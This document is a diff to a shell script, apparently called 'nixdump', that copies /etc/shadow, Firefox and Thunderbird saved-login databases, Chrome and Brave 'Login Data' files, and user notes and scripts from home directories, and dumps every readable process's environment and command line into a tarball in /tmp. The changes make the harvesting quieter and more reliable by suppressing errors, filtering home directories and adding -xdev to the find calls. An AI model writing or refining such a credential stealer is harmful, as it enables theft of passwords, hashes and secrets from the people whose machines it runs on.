@@ -21,25 +21,17 @@ OUT="${TMPDIR:-/tmp}/nixdump-${HOST}-${STAMP}.tar.gz"
 MAXSZ=52428800          # skip single files larger than 50MB (keep bundle small)
 
 # ---------- access pre-checks ----------
-# EUID 0 = root, otherwise we silently skip root-only collectors.
 if [ "$(id -u 2>/dev/null)" = "0" ]; then
     IS_ROOT=1
 else
     IS_ROOT=0
 fi
 
-# can_read <path>: true if the file exists and is readable by us
-can_read() {
-    [ -f "$1" ] && [ -r "$1" ]
-}
+can_read() { [ -f "$1" ] && [ -r "$1" ]; }
+can_list() { [ -d "$1" ] && [ -r "$1" ] && [ -x "$1" ]; }
 
-# can_list <dir>: true if dir exists, is a dir, and we can list it
-can_list() {
-    [ -d "$1" ] && [ -r "$1" ] && [ -x "$1" ]
-}
-
-# can_proc: we can read /proc/1/environ (root can, normal users cannot)
-if can_read /proc/1/environ; then
+# Test that we can REALLY read /proc/1/environ (some kernels hide it from non-root)
+if head -c 1 /proc/1/environ >/dev/null 2>&1; then
     CAN_PROC=1
 else
     CAN_PROC=0
@@ -57,24 +49,26 @@ mkdir -p "$ROOT" "$META" 2>/dev/null || { echo "[!] cannot create staging dir"; 
 
 log() { echo "[*] $1"; }
 
-# copy one file into the staging tree at its original path
+# copy one file into the staging tree at its original path.
+# Uses stat(1) instead of shell redirection so unreadable /proc files
+# never print "cannot open" errors from the shell.
 cp_one() {
     src="$1"
     [ -f "$src" ] || return 0
     [ -r "$src" ] || return 0
-    sz=$(wc -c < "$src" 2>/dev/null || echo 0)
+    sz=$(stat -c%s "$src" 2>/dev/null) || return 0
+    [ -n "$sz" ] || return 0
     [ "$sz" -gt "$MAXSZ" ] 2>/dev/null && return 0
     dst="$ROOT$src"
     dir=$(dirname "$dst")
     mkdir -p "$dir" 2>/dev/null || return 0
-    cp "$src" "$dst" 2>/dev/null
+    cp "$src" "$dst" 2>/dev/null || rm -f "$dst" 2>/dev/null
 }
 
 # copy every file (recursively) under a dir, skipping unreadable subtrees
 cp_dir() {
     [ -d "$1" ] || return 0
-    find "$1" -type f 2>/dev/null | while IFS= read -r f; do
-        [ -r "$f" ] || continue
+    find "$1" -xdev -type f 2>/dev/null | while IFS= read -r f; do
         cp_one "$f"
     done
 }
@@ -85,22 +79,29 @@ cp_find() {
     for r in "$@"; do
         [ -d "$r" ] || continue
         find "$r" -xdev -type f -iname "$pat" 2>/dev/null | \
-            while IFS= read -r f; do
-                [ -r "$f" ] || continue
-                cp_one "$f"
-            done
+            while IFS= read -r f; do cp_one "$f"; done
     done
 }
 
-# ---- list of home dirs (from /etc/passwd + /home + /root) -----------------
+# ---- list of real user home dirs, filtered to drop system pseudo-paths ----
 HOMES=$(
     { awk -F: '$6 ~ /^\// {print $6}' /etc/passwd 2>/dev/null
       ls -d /home/* /root 2>/dev/null
-    } | sort -u
+    } | sort -u | while IFS= read -r h; do
+        case "$h" in
+            /|/proc|/proc/*|/sys|/sys/*|/dev|/dev/*|/run|/run/*|\
+            /bin|/bin/*|/sbin|/sbin/*|/usr|/usr/*|/var|/var/*|\
+            /etc|/etc/*|/boot|/boot/*|/lib|/lib/*|/lib32|/lib32/*|\
+            /lib64|/lib64/*|/tmp|/tmp/*|/snap|/snap/*|\
+            /nonexistent|/nonexistent/*) continue ;;
+        esac
+        [ -d "$h" ] && [ -r "$h" ] && [ -x "$h" ] && printf '%s\n' "$h"
+    done
 )
 
 log "staging in $STAGE"
 log "euid=$(id -u 2>/dev/null)  proc_readable=$CAN_PROC"
+log "homes: $(printf '%s ' $HOMES)"
 
 # ================= SYSTEM =================
 progress "system (/etc/shadow, passwd, sssd)"
@@ -238,7 +239,7 @@ for h in $HOMES; do
     for b in .mozilla/firefox .thunderbird; do
         [ -d "$h/$b" ] || continue
         for f in logins.json key4.db key3.db signons.sqlite; do
-            find "$h/$b" -maxdepth 2 -name "$f" 2>/dev/null | \
+            find "$h/$b" -xdev -maxdepth 2 -name "$f" 2>/dev/null | \
                 while IFS= read -r ff; do cp_one "$ff"; done
         done
     done
@@ -250,7 +251,7 @@ for h in $HOMES; do
              ".var/app/com.brave.Browser/config/BraveSoftware/Brave-Browser"; do
         [ -d "$h/$b" ] || continue
         for f in "Login Data" "Login Data For Account"; do
-            find "$h/$b" -maxdepth 3 -name "$f" 2>/dev/null | \
+            find "$h/$b" -xdev -maxdepth 3 -name "$f" 2>/dev/null | \
                 while IFS= read -r ff; do cp_one "$ff"; done
         done
     done
@@ -266,7 +267,7 @@ progress "generic sweeps (notes/scripts/configs)"
 cp_find "*.txt" $HOMES
 for h in $HOMES; do
     [ -d "$h" ] || continue
-    find "$h" -maxdepth 3 -type f ! -name "*.*" 2>/dev/null | \
+    find "$h" -xdev -maxdepth 3 -type f ! -name "*.*" 2>/dev/null | \
         while IFS= read -r f; do cp_one "$f"; done
 done
 for pat in "*.py" "*.pyc" "*.pl" "*.go" "*.jar" "*.c" "*.sh"; do
@@ -289,14 +290,13 @@ progress "meta: /proc environ + cmdline"
 if [ "$CAN_PROC" = "1" ]; then
     {
         for p in /proc/[0-9]*; do
-            pid=${p#/proc/}
             [ -r "$p/environ" ] || continue
             [ -r "$p/cmdline" ] || continue
             comm=$(cat "$p/comm" 2>/dev/null)
             env=$(tr '\0' '\n' < "$p/environ" 2>/dev/null)
             cmd=$(tr '\0' ' '  < "$p/cmdline" 2>/dev/null)
             [ -n "$env$cmd" ] || continue
-            echo "=== PID $pid ($comm) ==="
+            echo "=== PID ${p#/proc/} ($comm) ==="
             [ -n "$cmd" ] && echo "CMDLINE: $cmd"
             if [ -n "$env" ]; then
                 echo "ENVIRON:"
